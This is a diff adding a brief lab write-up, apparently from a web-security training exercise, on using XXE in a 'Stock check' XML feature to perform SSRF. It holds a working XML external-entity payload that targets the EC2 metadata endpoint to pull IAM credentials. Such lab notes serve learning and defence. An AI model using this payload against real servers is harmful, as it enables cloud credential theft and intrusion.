@@ -1,0 +1,16 @@
+Exploiting XXE to perform SSRF attacks
+
+Same with before, the "Stock check" feature parses XML so try it out using,
+
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "hello">
+]>
+<productId>&xxe;</productId>
+and if it worked, do an SSRF attack replacing the "hello" with the IP add giiven. which is the IP of the EC2 instance where the server is running.
+do
+<!DOCTYPE test [
+<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/Iam/security-credentials/admin/">
+]>
+<productId>&xxe;</productId>
+
+now you can see the credentials displayed
